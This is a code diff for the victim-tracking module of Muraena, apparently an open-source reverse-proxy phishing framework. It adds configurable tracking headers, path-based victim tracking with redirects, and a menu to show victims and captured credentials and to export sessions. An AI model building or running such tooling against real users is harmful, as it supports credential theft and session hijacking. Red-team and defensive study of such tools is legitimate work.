@@ -12,6 +12,9 @@ import (
 	"strings"
 	"time"
 
+	"github.com/manifoldco/promptui"
+
+	"github.com/muraenateam/muraena/core"
 	"github.com/muraenateam/muraena/core/db"
 
 	"github.com/evilsocket/islazy/tui"
@@ -39,6 +42,8 @@ type Tracker struct {
 	Enabled        bool
 	Type           string
 	Identifier     string
+	Header         string
+	Landing        string
 	ValidatorRegex *regexp.Regexp
 }
 
@@ -64,12 +69,37 @@ func (module *Tracker) Author() string {
 }
 
 // Prompt prints module status based on the provided parameters
-func (module *Tracker) Prompt(what string) {
-	switch strings.ToLower(what) {
+func (module *Tracker) Prompt() {
+
+	menu := []string{
+		"victims",
+		"credentials",
+		"export",
+	}
+	result, err := session.DoModulePrompt(Name, menu)
+	if err != nil {
+		return
+	}
+
+	switch result {
 	case "victims":
 		module.ShowVictims()
+
 	case "credentials":
 		module.ShowCredentials()
+
+	case "export":
+		prompt := promptui.Prompt{
+			Label: "Enter session identifier",
+		}
+
+		result, err := prompt.Run()
+		if core.IsError(err) {
+			module.Warning("%v+\n", err)
+			return
+		}
+
+		module.ExportSession(result)
 	}
 }
 
@@ -84,6 +114,8 @@ func Load(s *session.Session) (m *Tracker, err error) {
 	m = &Tracker{
 		SessionModule: session.NewSessionModule(Name, s),
 		Enabled:       s.Config.Tracking.Enabled,
+		Header:        "If-Range",            // Default HTTP Header
+		Landing:       "If-Landing-Redirect", // Default Landing HTTP Header
 		Type:          strings.ToLower(s.Config.Tracking.Type),
 	}
 
@@ -94,6 +126,17 @@ func Load(s *session.Session) (m *Tracker, err error) {
 
 	config := s.Config.Tracking
 	m.Identifier = config.Identifier
+
+	// Set tracking header
+	if s.Config.Tracking.Header != "" {
+		m.Header = s.Config.Tracking.Header
+	}
+
+	// Set landing header
+	if s.Config.Tracking.Landing != "" {
+		m.Landing = s.Config.Tracking.Landing
+	}
+
 	// Default Trace format is UUIDv4
 	m.ValidatorRegex = regexp.MustCompile("^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4[a-fA-F0-9]{3}-[8|9|aA|bB][a-fA-F0-9]{3" +
 		"}-[a-fA-F0-9]{12}$")
@@ -213,18 +256,27 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 	}
 
 	noTraces := true
+	isTrackedPath := false
 
 	//
 	// Tracing types: Path || Query (default)
 	//
 	if module.Type == "path" {
-		re := regexp.MustCompile(`/([^/]+)`)
+		tr := module.Session.Config.Tracking
+
+		pathRegex := strings.Replace(tr.Identifier, "_", "/", -1) + tr.Regex
+		re := regexp.MustCompile(pathRegex)
+
 		match := re.FindStringSubmatch(request.URL.Path)
+		module.Info("tracking path match: %v", match)
+
 		if len(match) > 0 {
-			t = module.makeTrace(match[1])
+			t = module.makeTrace(match[0])
 			if t.IsValid() {
-				request.Header.Set("If-Landing-Redirect", strings.ReplaceAll(request.URL.Path, t.ID, ""))
+				request.Header.Set(module.Landing, strings.ReplaceAll(request.URL.Path, t.ID, ""))
+				module.Info("setting %s header to %s", module.Landing, strings.ReplaceAll(request.URL.Path, t.ID, ""))
 				noTraces = false
+				isTrackedPath = true
 			}
 		}
 	}
@@ -261,8 +313,8 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 
 	//
 	// Set trackers:
-	// - HTTP Headers If-Range
-	request.Header.Set("If-Range", t.ID)
+	// - HTTP Headers If-Range, or custom defined
+	request.Header.Set(module.Header, t.ID)
 
 	// Check if the Trace ID is bind to an existing victim
 	v, verr := module.GetVictim(t)
@@ -294,6 +346,11 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 	}
 
 	v.RequestCount++
+
+	if module.Type == "path" && isTrackedPath {
+		request.URL.Path = module.Session.Config.Tracking.RedirectTo
+	}
+
 	return
 }
 
@@ -318,8 +375,8 @@ func (module *Tracker) TrackResponse(response *http.Response) (victim *db.Victim
 	}
 
 	if !trackingFound {
-		// Trace not found in Cookies check If-Range HTTP Headers
-		t = module.makeTrace(response.Request.Header.Get("If-Range"))
+		// Trace not found in Cookies check If-Range (or custom defined) HTTP Headers
+		t = module.makeTrace(response.Request.Header.Get(module.Header))
 		if t.IsValid() {
 
 			cookieDomain := module.Session.Config.Proxy.Phishing
@@ -332,8 +389,7 @@ func (module *Tracker) TrackResponse(response *http.Response) (victim *db.Victim
 				fmt.Sprintf("%s=%s; Domain=%s; Path=/; Expires=Wed, 30 Aug 2029 00:00:00 GMT",
 					module.Identifier, t.ID, cookieDomain))
 
-			response.Header.Add("If-Range", t.ID)
-			// module.Debug("Found tracking in If-Range .. pushing cookie %s (%s)", response.Request.URL, t)
+			response.Header.Add(module.Header, t.ID)
 			trackingFound = true
 		}
 	}
